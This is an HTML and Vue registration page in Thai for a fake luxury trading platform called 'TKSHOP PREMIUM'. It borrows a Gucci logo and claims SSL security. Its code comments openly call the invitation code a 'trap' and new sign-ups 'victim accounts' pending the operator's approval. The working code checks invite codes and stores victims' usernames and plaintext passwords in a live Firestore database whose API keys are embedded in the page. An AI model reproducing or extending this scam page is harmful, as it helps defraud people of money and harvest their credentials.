<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TKSHOP - PREMIUM GLOBAL MARKET</title>
    <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/vant@4/lib/index.css"/>
    <script src="https://fastly.jsdelivr.net/npm/vue@3"></script>
    <script src="https://fastly.jsdelivr.net/npm/vant@4/lib/vant.min.js"></script>
    <style>
        /* ธีมมืดหรูหราเหมือนแอปเทรดระดับโลก */
        body { background: #010101; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; }
        .van-field { background: #1a1a1a; border-radius: 12px; margin-bottom: 15px; border: 1px solid #333; }
        .van-field__control { color: white; }
        .van-button--primary { background: #3c7eff; border: none; color: white; border-radius: 12px; font-weight: bold; height: 50px; }
        .van-nav-bar { background: #010101; border: none; }
        .van-nav-bar__title { color: white; font-weight: bold; }
        .header-logo { text-align: center; padding: 50px 0 30px 0; background: url('https://img.cppng.com/download/202006/3-2-luxury-items-png.png') no-repeat center center/cover; }
        .auth-container { padding: 30px; }
        .login-type-switcher { display: flex; justify-content: center; gap: 30px; margin-bottom: 30px; }
        .type-btn { color: #848e9c; background: none; border: none; padding: 10px; font-size: 16px; cursor: pointer; border-bottom: 2px solid transparent; }
        .type-btn.active { color: #3c7eff; border-bottom: 2px solid #3c7eff; font-weight: bold; }
        .footer-text { text-align: center; color: #666; font-size: 12px; margin-top: 30px; }
    </style>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        // ใช้ Config ของพี่เชื่อมต่อกับฐานข้อมูลจริง
        const firebaseConfig = {
            apiKey: "AIzaSyBf2BfaGTs6qQD3MO5tSZLLW-BuQFvDVwM",
            authDomain: "my-trading-db.firebaseapp.com",
            projectId: "my-trading-db",
            storageBucket: "my-trading-db.firebasestorage.app",
            messagingSenderId: "682968234759",
            appId: "1:682968234759:web:eb2978d1e4019b77cb23a2"
        };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const { createApp, ref } = Vue;
        createApp({
            setup() {
                const loginType = ref('email'); // 'email' หรือ 'mobile'
                const username = ref(''); // พิมพ์ชื่อผู้ใช้จริง
                const password = ref(''); // พิมพ์รหัสผ่านจริง
                const inviteCode = ref(''); // รหัสแนะนำ (กับดักหลัก)
                const isLoading = ref(false);

                // --- ส่วนของระบบ 'เดินจริง' ---

                // ระบบลงทะเบียนใหม่ (เนียนขั้นสุด บังคับใส่รหัสแนะนำ)
                const doRegister = async () => {
                    if (!username.value || !password.value || !inviteCode.value) {
                        vant.showFailToast('กรุณากรอกข้อมูลให้ครบถ้วน');
                        return;
                    }
                    vant.showLoadingToast({ message: 'กำลังตรวจสอบข้อมูลพรีเมียม...', forbidClick: true });
                    isLoading.value = true;

                    // ตรวจสอบรหัสแนะนำ (VIP999) ในฐานข้อมูลจริง
                    const codeSnap = await getDoc(doc(db, "codes", inviteCode.value));
                    if (!codeSnap.exists()) {
                        vant.showFailToast('รหัสแนะนำไม่ถูกต้อง');
                        isLoading.value = false;
                        return;
                    }

                    // สร้างบัญชีเหยื่อในฐานข้อมูลจริง
                    try {
                        await setDoc(doc(db, "users", username.value), { 
                            pass: password.value, 
                            balance: 0, 
                            status: 'pending', // รอพี่อนุมัติหลังบ้าน
                            registered_with: inviteCode.value 
                        });
                        vant.showSuccessToast('สมัครสำเร็จ! บัญชีอยู่ระหว่างตรวจสอบ');
                        username.value = password.value = inviteCode.value = '';
                    } catch (error) {
                        vant.showFailToast('เกิดข้อผิดพลาดในการสมัคร');
                    } finally {
                        isLoading.value = false;
                    }
                };
                return { loginType, username, password, inviteCode, isLoading, doRegister };
            }
        }).use(vant).mount('#app');
    </script>
</head>
<body>
    <div id="app">
        <div style="position: absolute; right: 20px; top: 20px; color: white; font-size: 14px; z-index: 10;">
            <img src="https://flagcdn.com/w20/th.png" width="20"> TH / <img src="https://flagcdn.com/w20/us.png" width="20"> EN
        </div>
        
        <div class="header-logo">
            <img src="https://logolook.net/wp-content/uploads/2021/07/Gucci-Logo.png" alt="Logo" style="width: 100px; margin-bottom: 10px;">
            <div style="font-size: 24px; font-weight: bold;">TKSHOP PREMIUM</div>
            <div style="color: #aaa; font-size: 14px;">Global Secure Trading Center</div>
        </div>

        <div class="auth-container">
            <div class="login-type-switcher">
                <button class="type-btn" :class="{active: loginType === 'email'}" @click="loginType = 'email'">อีเมล</button>
                <button class="type-btn" :class="{active: loginType === 'mobile'}" @click="loginType = 'mobile'">เบอร์โทรศัพท์</button>
            </div>

            <div v-if="loginType === 'email'">
                <van-field v-model="username" label="อีเมล" placeholder="กรอกอีเมลของคุณ" left-icon="envelop-o"></van-field>
            </div>
            <div v-if="loginType === 'mobile'">
                <van-field v-model="username" label="เบอร์โทร" placeholder="กรอกเบอร์โทรศัพท์" left-icon="phone-o">
                    <template #left-icon>
                        <img src="https://flagcdn.com/w20/th.png" width="20" style="margin-right: 5px;"> +66
                    </template>
                </van-field>
            </div>

            <van-field v-model="password" type="password" label="รหัสผ่าน" placeholder="กรอกรหัสผ่านใหม่" left-icon="lock"></van-field>
            
            <van-field v-model="inviteCode" label="รหัสแนะนำ" placeholder="ระบุรหัสแนะนำ (Invitation Code)" left-icon="gold-coin-o"></van-field>

            <van-button block type="primary" :loading="isLoading" @click="doRegister" style="margin-top: 30px;">
                ลงทะเบียนระดับพรีเมียม
            </van-button>
            <div class="footer-text">Security Powered by Global SSL Encryption</div>
        </div>
    </div>
</body>
</html>
